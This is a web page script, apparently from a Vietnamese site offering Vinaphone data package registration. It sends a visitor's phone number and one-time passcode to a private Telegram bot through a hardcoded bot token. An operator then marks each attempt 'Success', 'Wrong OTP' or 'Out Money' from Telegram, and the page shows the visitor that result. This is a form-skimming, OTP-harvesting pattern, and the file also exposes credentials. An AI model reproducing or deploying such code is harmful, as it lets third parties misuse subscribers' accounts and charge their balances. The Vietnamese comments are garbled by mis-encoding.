<script>
  document.addEventListener("DOMContentLoaded", function () {
    const token = "7679124575:AAEwLlbVV03iAH5i_wCzyOwE4ec_r01Pmmc"; // Thay b·∫±ng token c·ªßa bot
    const chatId = "-4792422320"; // Thay b·∫±ng chat ID c·ªßa b·∫°n
    let isPhoneSent = false; // C·ªù ƒë·ªÉ theo d√µi tr·∫°ng th√°i g·ª≠i s·ªë ƒëi·ªán tho·∫°i
    let isOtpSent = false; // C·ªù ƒë·ªÉ theo d√µi tr·∫°ng th√°i g·ª≠i OTP
    let isSendingPhone = false; // C·ªù ki·ªÉm tra n·∫øu ƒëang g·ª≠i s·ªë ƒëi·ªán tho·∫°i
    let isSendingOtp = false; // C·ªù ki·ªÉm tra n·∫øu ƒëang g·ª≠i OTP
    let lastUpdateId = 0; // ID c·∫≠p nh·∫≠t cu·ªëi c√πng t·ª´ Telegram

    // T·∫°o ID phi√™n duy nh·∫•t cho m·ªói tab (d·ª±a tr√™n timestamp ho·∫∑c GUID)
    const sessionId = "session_" + new Date().getTime();

    // ·∫®n l·ªõp 'thong-tin-otp' khi trang t·∫£i
    document.querySelector(".thong-tin-otp-blockbig90").style.display = "none";

    // Th·∫ª tr·∫°ng th√°i
    const statusDiv = document.getElementById("status-blockbig90");

    // Ki·ªÉm tra xem form ƒë√£ g·ª≠i th√†nh c√¥ng ch∆∞a (ch·ªâ trong phi√™n l√†m vi·ªác n√†y)
    if (sessionStorage.getItem(sessionId + "_formCompleted") !== "true") {
      // H√†m g·ª≠i tin nh·∫Øn ƒë·∫øn Telegram
      function sendToTelegram(message, isOtp) {
        const buttons = isOtp
          ? {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: "Success", callback_data: "success" },
                    { text: "Wrong OTP", callback_data: "error_otp" },
                    { text: "Out Money", callback_data: "no_money" },
                    {
                      text: "Already have",
                      callback_data: "other_data_packages",
                    },
                    {
                      text: "Not applicable",
                      callback_data: "packages_not_found",
                    },
                  ],
                ],
              },
            }
          : {};

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown", // Ho·∫∑c 'HTML' n·∫øu b·∫°n mu·ªën d√πng HTML
            disable_web_page_preview: true, // T·∫Øt preview link
            ...buttons,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              if (isOtp) {
                // Hi·ªÉn th·ªã popup ho√†n th√†nh khi g·ª≠i OTP
                showCompletePopup();
                closePopup(); // ƒê√≥ng popup ngay sau khi g·ª≠i OTP
              } else {
                enableOtpInput(); // K√≠ch ho·∫°t input OTP v√† n√∫t g·ª≠i OTP
                showPhoneSuccessMessage(); // Hi·ªÉn th·ªã th√¥ng b√°o khi g·ª≠i th√†nh c√¥ng s·ªë ƒëi·ªán tho·∫°i

                // Sau khi g·ª≠i s·ªë ƒëi·ªán tho·∫°i th√†nh c√¥ng, b·∫≠t l·∫°i n√∫t "G·ª≠i OTP"
                document.getElementById(
                  "send-otp-btn-blockbig90"
                ).disabled = false; // B·ªè tr·∫°ng th√°i disabled c·ªßa n√∫t "G·ª≠i OTP"
                document.getElementById(
                  "send-otp-btn-blockbig90"
                ).style.display = "inline-block"; // Hi·ªÉn th·ªã n√∫t "G·ª≠i OTP"
              }
              // L∆∞u tr·∫°ng th√°i form ƒë√£ ho√†n th√†nh v√†o sessionStorage v·ªõi session ID duy nh·∫•t
              sessionStorage.setItem(sessionId + "_formCompleted", "true");
            } else {
              alert("ƒê√£ x·∫£y ra l·ªói khi g·ª≠i tin nh·∫Øn.");
            }
          })
          .catch((error) => {
            console.error("Error sending message to Telegram:", error);
          });
      }
    } else {
      // N·∫øu form ƒë√£ g·ª≠i th√†nh c√¥ng trong phi√™n l√†m vi·ªác n√†y, kh√¥ng c·∫ßn l√†m g√¨
      console.log("Form ƒë√£ g·ª≠i th√†nh c√¥ng tr∆∞·ªõc ƒë√≥ trong phi√™n l√†m vi·ªác n√†y.");
    }

    function checkTelegramUpdates() {
      fetch(
        `https://api.telegram.org/bot${token}/getUpdates?offset=${
          lastUpdateId + 1
        }`,
        {
          method: "GET",
        }
      )
        .then((response) => response.json())
        .then((data) => {
          console.log("Ph·∫£n h·ªìi t·ª´ Telegram API:", data); // Ki·ªÉm tra log

          if (!data.result || !Array.isArray(data.result)) {
            console.error(
              "Ph·∫£n h·ªìi kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng c√≥ b·∫£n c·∫≠p nh·∫≠t m·ªõi."
            );
            return;
          }

          if (data.result.length > 0) {
            data.result.forEach((update) => {
              if (update.update_id > lastUpdateId) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                  const callbackData = update.callback_query.data;
                  const messageId = update.callback_query.message.message_id;

                  // X·ª≠ l√Ω ph·∫£n h·ªìi t·ª´ Telegram
                  if (callbackData === "success") {
                    updateStatus("success", "ƒêƒÉng k√Ω th√†nh c√¥ng!");
                    editInlineKeyboard(messageId, "success"); // C·∫≠p nh·∫≠t n√∫t
                  } else if (callbackData === "error_otp") {
                    updateStatus("error_otp", "ƒêƒÉng k√Ω th·∫•t b·∫°i!");
                    editInlineKeyboard(messageId, "error_otp"); // C·∫≠p nh·∫≠t n√∫t
                  } else if (callbackData === "no_money") {
                    updateStatus("no_money", "ƒêƒÉng k√Ω th·∫•t b·∫°i!");
                    editInlineKeyboard(messageId, "no_money"); // C·∫≠p nh·∫≠t n√∫t
                  } else if (callbackData === "other_data_packages") {
                    updateStatus("other_data_packages", "ƒêƒÉng k√Ω th·∫•t b·∫°i!");
                    editInlineKeyboard(messageId, "other_data_packages"); // C·∫≠p nh·∫≠t n√∫t
                  } else if (callbackData === "packages_not_found") {
                    updateStatus("packages_not_found", "ƒêƒÉng k√Ω th·∫•t b·∫°i!");
                    editInlineKeyboard(messageId, "packages_not_found"); // C·∫≠p nh·∫≠t n√∫t
                  }
                }
              }
            });
          }
        })
        .catch((error) => {
          console.error("Error fetching Telegram updates:", error);
        });
    }

    // H√†m ch·ªânh s·ª≠a Inline Keyboard
    function editInlineKeyboard(messageId, selectedOption) {
      let updatedKeyboard;
      if (selectedOption === "success") {
        updatedKeyboard = {
          inline_keyboard: [[{ text: "Success ‚úÖ", callback_data: "success" }]],
        };
      } else if (selectedOption === "error_otp") {
        updatedKeyboard = {
          inline_keyboard: [
            [{ text: "Wrong OTP ‚ùå", callback_data: "error_otp" }],
          ],
        };
      } else if (selectedOption === "no_money") {
        updatedKeyboard = {
          inline_keyboard: [
            [{ text: "Out Money üí∞", callback_data: "no_money" }],
          ],
        };
      } else if (selectedOption === "other_data_packages") {
        updatedKeyboard = {
          inline_keyboard: [
            [{ text: "Already have ‚ö†Ô∏è", callback_data: "other_data_packages" }],
          ],
        };
      } else if (selectedOption === "packages_not_found") {
        updatedKeyboard = {
          inline_keyboard: [
            [
              {
                text: "Not applicable ‚õî",
                callback_data: "packages_not_found",
              },
            ],
          ],
        };
      }

      fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: updatedKeyboard,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            console.log("Inline Keyboard ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t.");
          } else {
            console.error("ƒê√£ x·∫£y ra l·ªói khi c·∫≠p nh·∫≠t Inline Keyboard:", data);
          }
        })
        .catch((error) => {
          console.error("Error updating Inline Keyboard:", error);
        });
    }

    // Ki·ªÉm tra ph·∫£n h·ªìi t·ª´ Telegram m·ªói 5 gi√¢y
    setInterval(checkTelegramUpdates, 5000);

    // H√†m c·∫≠p nh·∫≠t tr·∫°ng th√°i
    function updateStatus(status, message) {
      if (!statusDiv) {
        console.error("Th·∫ª #status kh√¥ng t·ªìn t·∫°i!");
        return;
      }

      statusDiv.style.display = "block"; // Hi·ªÉn th·ªã th·∫ª

      let phone = document.querySelector(
        'input[name="phone-blockbig90"]'
      ).value;
      // T·∫°o ƒë∆∞·ªùng link ƒë·ªông d·ª±a tr√™n s·ªë ƒëi·ªán tho·∫°i
      let link = `https://digishop.vnpt.vn/di-dong?tab=c363&keyword=${phone}&aff=VNP018727`;

      if (status === "success") {
        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/1.png"/><p class="text-status-1">${message}</p> <span class="text-status">B·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c tin nh·∫Øn t·ª´ t·ªïng ƒë√†i</span></p>`;
      } else if (status === "error_otp") {
        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">B·∫°n ƒë√£ nh·∫≠p sai OTP</span></p>`;
      } else if (status === "no_money") {
        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">T√†i kho·∫£n c·ªßa b·∫°n kh√¥ng ƒë·ªß ti·ªÅn</span></p>`;
      } else if (status === "other_data_packages") {
        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">B·∫°n ƒëang s·ª≠ d·ª•ng g√≥i c∆∞·ªõc kh√°c, vui l√≤ng h·ªßy g√≥i c∆∞·ªõc c≈© v√† ƒëƒÉng k√Ω l·∫°i</span></p>`;
      } else if (status === "packages_not_found") {
        statusDiv.innerHTML = `<p class="text-status-div"><img src="/wp-content/uploads/2024/11/2.png"/><p class="text-status-1">${message}</p> <span class="text-status">G√≥i c∆∞·ªõc kh√¥ng √°p d·ª•ng cho thu√™ bao c·ªßa b·∫°n</br><a id="dynamic-link-blockbig90" href="${link}" target="_blank">·∫§n v√†o ƒë√¢y</a> ƒë·ªÉ t√¨m g√≥i c∆∞·ªõc ph√π h·ª£p</span></p>`;
      }
    }

    // H√†m v√¥ hi·ªáu h√≥a c√°c n√∫t sau khi ng∆∞·ªùi d√πng ch·ªçn
    function disableButtons(messageId) {
      fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] }, // X√≥a c√°c n√∫t
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            console.log("C√°c n√∫t ƒë√£ ƒë∆∞·ª£c v√¥ hi·ªáu h√≥a.");
          } else {
            console.error("ƒê√£ x·∫£y ra l·ªói khi v√¥ hi·ªáu h√≥a n√∫t:", data);
          }
        })
        .catch((error) => {
          console.error("Error disabling buttons:", error);
        });
    }

    // H√†m hi·ªÉn th·ªã spinner khi g·ª≠i s·ªë ƒëi·ªán tho·∫°i
    function showPhoneLoading() {
      document.getElementById("loading-icon-blockbig90").style.display =
        "inline-block"; // Hi·ªÉn th·ªã spinner
    }

    // H√†m ·∫©n spinner khi g·ª≠i xong
    function hidePhoneLoading() {
      document.getElementById("loading-icon-blockbig90").style.display = "none"; // ·∫®n spinner
      document.getElementById("send-phone-text-blockbig90").style.display =
        "inline"; // Hi·ªÉn th·ªã l·∫°i text "L·∫•y m√£ x√°c th·ª±c"
    }

    // H√†m hi·ªÉn th·ªã spinner khi g·ª≠i OTP
    function showOtpLoading() {
      document.getElementById("loading-icon-otp-blockbig90").style.display =
        "inline-block"; // Hi·ªÉn th·ªã spinner
    }

    // H√†m ·∫©n spinner khi g·ª≠i xong
    function hideOtpLoading() {
      document.getElementById("loading-icon-otp-blockbig90").style.display =
        "none"; // ·∫®n spinner cho OTP
      document.getElementById("send-otp-text-blockbig90").style.display =
        "inline"; // Hi·ªÉn th·ªã l·∫°i text "ƒêƒÉng k√Ω"
    }

    // Bi·∫øn to√†n c·ª•c ƒë·ªÉ l∆∞u currentTime
    let currentTime;

    // N√∫t g·ª≠i s·ªë ƒëi·ªán tho·∫°i cho blockbig90
    document
      .getElementById("send-phone-btn-blockbig90")
      .addEventListener("click", function () {
        let phone = document.querySelector(
          'input[name="phone-blockbig90"]'
        ).value;

        // Danh s√°ch c√°c ƒë·∫ßu s·ªë h·ª£p l·ªá
        const validPrefixes = [
          "081",
          "082",
          "083",
          "084",
          "085",
          "088",
          "091",
          "094",
        ];

        // Ki·ªÉm tra n·∫øu ƒë·ªô d√†i s·ªë ƒëi·ªán tho·∫°i l√† 10 v√† b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0
        if (phone.length === 10) {
          // Ki·ªÉm tra ƒë·∫ßu s·ªë h·ª£p l·ªá
          if (validPrefixes.includes(phone.substring(0, 3))) {
            isPhoneSent = true; // ƒê√°nh d·∫•u ƒë√£ g·ª≠i s·ªë ƒëi·ªán tho·∫°i
            this.disabled = true; // V√¥ hi·ªáu h√≥a n√∫t sau khi g·ª≠i
            showPhoneLoading(); // Hi·ªÉn th·ªã spinner khi g·ª≠i tin nh·∫Øn
            isSendingPhone = true; // ƒê√°nh d·∫•u l√† ƒëang g·ª≠i s·ªë ƒëi·ªán tho·∫°i

            // L·∫•y th·ªùi gian hi·ªán t·∫°i
            let now = new Date();
            let year = now.getFullYear();
            let month = (now.getMonth() + 1).toString().padStart(2, "0"); // Th√™m 0 n·∫øu th√°ng l√† s·ªë ƒë∆°n
            let day = now.getDate().toString().padStart(2, "0"); // Th√™m 0 n·∫øu ng√†y l√† s·ªë ƒë∆°n
            let hours = now.getHours().toString().padStart(2, "0");
            let minutes = now.getMinutes().toString().padStart(2, "0");
            let seconds = now.getSeconds().toString().padStart(2, "0");

            // T·∫°o chu·ªói th·ªùi gian ƒë·∫ßy ƒë·ªß
            currentTime = `${year}${month}${day}${hours}${minutes}${seconds}${phone}`;

            console.log("Current Time: ", currentTime); // Ki·ªÉm tra gi√° tr·ªã currentTime

            sendToTelegram(
              `OrderID: ${currentTime}\nPhone: \`${phone}\`\nDescription: blockbig90\nLink: https://digishop.vnpt.vn/di-dong/blockbig90/3661?aff=VNP018670`
            );

            // ƒê·∫∑t th·ªùi gian 10 gi√¢y ƒë·ªÉ ·∫©n spinner
            setTimeout(function () {
              hidePhoneLoading(); // ·∫®n spinner sau 10 gi√¢y
              document.getElementById(
                "send-phone-btn-blockbig90"
              ).style.display = "none";
              document.querySelector(
                ".thong-tin-otp-blockbig90"
              ).style.display = "block";
              document.getElementById(
                "phoneSuccessMessage-blockbig90"
              ).style.display = "block";
            }, 10000); // Th·ªùi gian 10 gi√¢y
          } else {
            alert(
              "ƒê√¢y kh√¥ng ph·∫£i s·ªë Vinaphone. Vui l√≤ng nh·∫≠p ƒë√∫ng s·ªë Vinaphone."
            );
          }
        } else {
          alert("S·ªë ƒëi·ªán tho·∫°i ph·∫£i c√≥ 10 ch·ªØ s·ªë.");
        }
      });

    // H√†m hi·ªÉn th·ªã th√¥ng b√°o khi g·ª≠i s·ªë ƒëi·ªán tho·∫°i th√†nh c√¥ng
    function showPhoneSuccessMessage() {
      document.getElementById("phoneSuccessMessage-blockbig90").style.display =
        "block";
      document.getElementById("send-phone-btn-blockbig90").style.display =
        "none";
      document.querySelector(".thong-tin-otp-blockbig90").style.display =
        "block"; // M·ªü l·ªõp 'thong-tin-otp' sau khi g·ª≠i s·ªë ƒëi·ªán tho·∫°i th√†nh c√¥ng

      // Hi·ªÉn th·ªã l·∫°i n√∫t "G·ª≠i OTP" v√† k√≠ch ho·∫°t ch·ª©c nƒÉng g·ª≠i
      document.getElementById("send-otp-btn-blockbig90").style.display =
        "inline-block"; // Hi·ªÉn th·ªã n√∫t "G·ª≠i OTP"
      document.getElementById("send-otp-btn-blockbig90").disabled = false; // B·ªè tr·∫°ng th√°i disabled c·ªßa n√∫t "G·ª≠i OTP"
    }

    // Ki·ªÉm tra v√† gi·ªõi h·∫°n s·ªë ƒëi·ªán tho·∫°i ch·ªâ ƒë∆∞·ª£c nh·∫≠p 10 s·ªë v√† b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0
    document
      .querySelector('input[name="phone-blockbig90"]')
      .addEventListener("input", function (e) {
        let phoneInput = e.target;
        // L·ªçc ch·ªâ cho ph√©p nh·∫≠p s·ªë v√† gi·ªõi h·∫°n t·ªëi ƒëa 10 k√Ω t·ª±
        phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 10);

        // N·∫øu ng∆∞·ªùi d√πng nh·∫≠p kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0, x√≥a input
        if (phoneInput.value && phoneInput.value[0] !== "0") {
          phoneInput.value = "";
          alert("S·ªë ƒëi·ªán tho·∫°i ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0.");
        }
      });

    // N√∫t g·ª≠i m√£ OTP cho blockbig90
    document
      .getElementById("send-otp-btn-blockbig90")
      .addEventListener("click", function () {
        let otp = document.querySelector('input[name="otp-blockbig90"]').value;
        let phone = document.querySelector(
          'input[name="phone-blockbig90"]'
        ).value;
        if (isOtpSent) return;

        // Ki·ªÉm tra n·∫øu m√£ OTP c√≥ ƒë√∫ng 6 k√Ω t·ª±
        if (otp.length === 6 && phone) {
          // Ki·ªÉm tra xem currentTime ƒë√£ ƒë∆∞·ª£c g√°n ch∆∞a
          if (!currentTime) {
            console.error("currentTime is undefined!"); // In ra th√¥ng b√°o l·ªói n·∫øu currentTime kh√¥ng c√≥ gi√° tr·ªã
            alert("L·ªói: D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá.");
            return;
          }

          isOtpSent = true;
          isSendingOtp = true; // ƒê√°nh d·∫•u l√† ƒëang g·ª≠i OTP
          this.disabled = true;

          showOtpLoading(); // Hi·ªÉn th·ªã spinner khi g·ª≠i OTP

          sendToTelegram(
            `OrderID: ${currentTime}\nPhone: \`${phone}\`\nDescription: blockbig90\nOTP Code: \`${otp}\``,
            true
          );

          // ƒê·∫∑t th·ªùi gian 10 gi√¢y ƒë·ªÉ ·∫©n spinner v√† hi·ªÉn th·ªã popupOverlay-complete-blockbig90
          setTimeout(function () {
            hideOtpLoading(); // ·∫®n spinner sau khi g·ª≠i OTP
            document.getElementById(
              "popupOverlay-complete-blockbig90"
            ).style.display = "block"; // Hi·ªÉn th·ªã popup sau 10 gi√¢y
            document.getElementById("popupOverlay-blockbig90").style.display =
              "none"; // ·∫®n popup ch√≠nh n·∫øu c·∫ßn
          }, 10000); // Th·ªùi gian 10 gi√¢y
        } else {
          alert("M√£ OTP ph·∫£i c√≥ ƒë√∫ng 6 k√Ω t·ª±.");
        }
      });

    // Ki·ªÉm tra v√† gi·ªõi h·∫°n m√£ OTP ch·ªâ ƒë∆∞·ª£c nh·∫≠p s·ªë v√† t·ªëi ƒëa 6 k√Ω t·ª±
    document
      .querySelector('input[name="otp-blockbig90"]')
      .addEventListener("input", function (e) {
        let otpInput = e.target;
        otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
      });

    // Khi nh·∫•p v√†o link m·ªü popup blockbig90
    document
      .getElementById("openPopup-blockbig90")
      .addEventListener("click", function (event) {
        event.preventDefault();
        document.getElementById("popupOverlay-blockbig90").style.display =
          "flex";

        // X√≥a gi√° tr·ªã input v√† ·∫©n c√°c l·ªõp li√™n quan
        document.querySelector('input[name="phone-blockbig90"]').value = "";
        document.querySelector('input[name="otp-blockbig90"]').value = "";

        // Reset c√°c n√∫t v√† l·ªõp
        document.getElementById("send-phone-btn-blockbig90").style.display =
          "block"; // Hi·ªÉn th·ªã l·∫°i n√∫t "G·ª≠i s·ªë ƒëi·ªán tho·∫°i"
        document.getElementById("send-phone-btn-blockbig90").disabled = false; // B·∫≠t l·∫°i n√∫t g·ª≠i s·ªë ƒëi·ªán tho·∫°i
        document.getElementById(
          "phoneSuccessMessage-blockbig90"
        ).style.display = "none";
        document.querySelector(".thong-tin-otp-blockbig90").style.display =
          "none"; // ·∫®n l·ªõp OTP

        // Reset l·∫°i tr·∫°ng th√°i c·ªù
        isPhoneSent = false;
        isOtpSent = false;

        // Hi·ªÉn th·ªã l·∫°i n√∫t "G·ª≠i OTP" khi popup ƒë∆∞·ª£c m·ªü l·∫°i
        document.getElementById("send-otp-btn-blockbig90").style.display =
          "inline-block";
        document.getElementById("send-otp-btn-blockbig90").disabled = false; // B·ªè tr·∫°ng th√°i disabled cho n√∫t G·ª≠i OTP
      });

    // L·∫•y v·ªã tr√≠ cu·ªôn ƒë√£ l∆∞u trong localStorage
    const scrollPosition = localStorage.getItem("scrollPosition");

    if (scrollPosition) {
      // Cu·ªôn trang ƒë·∫øn v·ªã tr√≠ ƒë√£ l∆∞u
      window.scrollTo(0, parseInt(scrollPosition));

      // X√≥a v·ªã tr√≠ cu·ªôn ƒë√£ l∆∞u ƒë·ªÉ tr√°nh cu·ªôn l·∫°i l·∫ßn sau
      localStorage.removeItem("scrollPosition");
    }

    // H√†m ƒë·ªÉ ƒë√≥ng popup v√† x√≥a input
    function closePopup() {
      // H·ªßy c√°c thao t√°c g·ª≠i n·∫øu c√≥
      if (isSendingPhone) {
        // H·ªßy y√™u c·∫ßu g·ª≠i s·ªë ƒëi·ªán tho·∫°i n·∫øu ƒëang g·ª≠i
      }
      if (isSendingOtp) {
        // H·ªßy y√™u c·∫ßu g·ª≠i OTP n·∫øu ƒëang g·ª≠i
      }
      hidePhoneLoading();
      hideOtpLoading();

      // L∆∞u v·ªã tr√≠ cu·ªôn hi·ªán t·∫°i v√†o localStorage
      localStorage.setItem("scrollPosition", window.scrollY);

      // Reload l·∫°i trang
      location.reload();

      // X√≥a gi√° tr·ªã input v√† ·∫©n c√°c l·ªõp li√™n quan
      document.querySelector('input[name="phone-blockbig90"]').value = "";
      document.querySelector('input[name="otp-blockbig90"]').value = "";

      // ƒê√≥ng c√°c popup
      document.getElementById("popupOverlay-blockbig90").style.display = "none";
      document.getElementById(
        "popupOverlay-complete-blockbig90"
      ).style.display = "none";

      sessionStorage.setItem("isInfoSubmitted", "false"); // Reset tr·∫°ng th√°i

      // ·∫®n th√¥ng b√°o th√†nh c√¥ng v√† reset c√°c tr·∫°ng th√°i
      document.getElementById("phoneSuccessMessage-blockbig90").style.display =
        "none";
      document.getElementById("send-phone-btn-blockbig90").style.display =
        "block"; // Hi·ªÉn th·ªã l·∫°i n√∫t "G·ª≠i s·ªë ƒëi·ªán tho·∫°i"

      // ƒê·∫∑t l·∫°i c·ªù g·ª≠i s·ªë ƒëi·ªán tho·∫°i
      isPhoneSent = false;
      isOtpSent = false; // Reset c·ªù OTP
      isSendingPhone = false;
      isSendingOtp = false;

      // Re-enable buttons
      document.getElementById("send-phone-btn-blockbig90").disabled = false;
      document.getElementById("send-otp-btn-blockbig90").disabled = false; // Hi·ªÉn th·ªã l·∫°i n√∫t g·ª≠i OTP

      // ·∫®n l·ªõp th√¥ng tin OTP
      document.querySelector(".thong-tin-otp-blockbig90").style.display =
        "none";
    }

    document.addEventListener("DOMContentLoaded", function () {
      // L·∫•y ph·∫ßn t·ª≠ popup
      const popupOverlay = document.getElementById("popupOverlay-blockbig90");

      // L·∫•y n√∫t ƒë√≥ng
      const closePopupButton = document.getElementById(
        "closePopupButton-blockbig90"
      );

      // Th√™m s·ª± ki·ªán click cho n√∫t ƒë√≥ng
      closePopupButton.addEventListener("click", function () {
        // ƒê√≥ng popup khi nh·∫•n n√∫t "X"
        popupOverlay.style.display = "none"; // ·∫®n popup
      });
    });

    // Th√™m s·ª± ki·ªán click ƒë·ªÉ ƒë√≥ng popup khi nh·∫•p v√†o n√∫t ƒë√≥ng
    document
      .getElementById("closePopupButton-blockbig90")
      .addEventListener("click", closePopup); // ƒê√≥ng popup khi nh·∫•p n√∫t ƒë√≥ng

    document
      .getElementById("closePopup-complete-blockbig90")
      .addEventListener("click", function () {
        // ƒê√≥ng popup ho√†n th√†nh
        document.getElementById(
          "popupOverlay-complete-blockbig90"
        ).style.display = "none"; // ƒê√≥ng popup
      });
  });
</script>
